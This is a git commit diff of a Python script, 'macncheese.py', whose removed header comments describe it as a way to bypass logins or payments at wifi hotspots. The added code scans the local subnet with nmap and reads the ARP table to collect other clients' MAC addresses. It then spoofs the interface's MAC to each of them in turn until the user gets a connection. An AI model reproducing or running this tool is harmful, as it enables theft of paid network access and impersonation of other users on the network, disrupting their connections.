677b7e70179388a700628f25c32143391005891e
Marco <marco.munizaga@ufl.edu>
2011-09-27 15:00:40 -0400

    working version of mac and cheese. updated readme

--- macncheese.py
+++ macncheese.py
@@ -1,37 +1,11 @@
-# This code will allow one to bypass the required logins or payements in wifi hotspots
-# Provided that there are people around that are logged in/paying
-# It is by no means fool proof and your mileage may very
-# More of a proof of concept
-# so yeah
 
+import os, sys, time, subprocess
 
-
-#first thing is to find your ip domain. i.e. 192.168.1.* 
-
-
-#once we have that we launch an nmap ping of every address withing that subdomain
-
-#while the ping is running we listen into the arp table. The network should give us
-#the mac address of the nearby computers when we tell it we are pinging 
-#inside the network
-
-#once the arp table has been built or after a minute or so, we read the arp tables and we pick out valid mac addresses that aren't our own
-
-#we bring the interface down, we change the mac address bring it up and verify 
-#the adress has changed
-
-#Then we hold on for a bit and ask the user if he is connected or not
-
-
-
-import time
-import subprocess
-
-
+#make sure to change this to your interface!
+iface='eth8'
 
 #find the mac address and ip domain of interface
 def findLocalNetworkInfo():
-    iface='eth8'
     sout=subprocess.check_output('ifconfig',shell=True)
     sout=sout.split('\n')
 
@@ -57,24 +31,26 @@ def findLocalNetworkInfo():
     netInfo = {'ipDomain':ipDomain,'systemMac':systemMac}
     return netInfo
 
-def startNmap():
-    nmap = subprocess.Popen(['nmap','-sP','10.2.243.*'],stdout=subprocess.PIPE) #start the nmap process
+def startNmap(ipDomain):
+    nmap = subprocess.Popen(['nmap','-sP',ipDomain],stdout=subprocess.PIPE) #start the nmap process
     return nmap
 
 def listenToArp():
     arpTable = subprocess.Popen(['arp','-a'],stdout=subprocess.PIPE) #start the nmap process
     return arpTable
 
-def populateMacAddress():
-    nmap = startNmap()
+def populateMacAddress(netInfo):
+    nmap = startNmap(netInfo['ipDomain'])
     arpTable = listenToArp()
     i=0
+    m=1
     while arpTable.poll() is None:
         print 'Waiting on the arp table to finish building'
         i+=1
         time.sleep(10)
         if i>5:
-            print "my o my it is taking quite a long time!"
+            print m, "minute(s) have passed and we are still building..."
+            m+=1
             i=0;
 
     arpCache = arpTable.stdout.read()
@@ -85,15 +61,39 @@ def populateMacAddress():
             validMAClist.append(row)
 
     print 'validmac list is ', validMAClist
-    print 'arpchace is',arpCache
+    print 'arpcache is',arpCache
     for i in range(len(validMAClist)):
         startIndex = validMAClist[i].find('at')+3 # 2 chars and a space
         endIndex = startIndex+17
         validMAClist[i]=validMAClist[i][startIndex:endIndex]
+    try:
+        validMAClist.remove(netInfo['systemMac'])    #remove the system mac address from list
+    except:
+        pass
     print 'the macs that are valid are:', validMAClist
     return validMAClist
 
+def resetMAC():
+    netInfo=findLocalNetworkInfo()
 
-netInfo=findLocalNetworkInfo()
-populateMacAddress()
+    validMAClist = populateMacAddress(netInfo)
 
+    for mac in validMAClist:
+        print 'Okay we are going to try', mac, 'tell me if it works'
+        subprocess.call('ifconfig '+iface+' down', shell=True)
+        subprocess.call('ifconfig '+iface+' hw ether ' + mac, shell=True)
+        subprocess.call('ifconfig '+iface+' up', shell=True)
+        diditwork = raw_input('I changed your mac address, are you connected? (no will change your mac address again, q will quit the program and restore your original mac address)(q/n)')
+        if diditwork=='q':
+            print 'Have nice day :)'
+            subprocess.call('ifconfig '+iface+' down', shell=True)
+            subprocess.call('ifconfig '+iface+' hw ether ' + netInfo['systemMac'], shell=True)
+            subprocess.call('ifconfig '+iface+' up', shell=True)
+            break
+
+user=subprocess.check_output('whoami',shell=True)
+if "root" not in user:
+    print "got r00t? - I need root to change your mac address!"
+    sys.exit()
+else:
+    resetMAC()
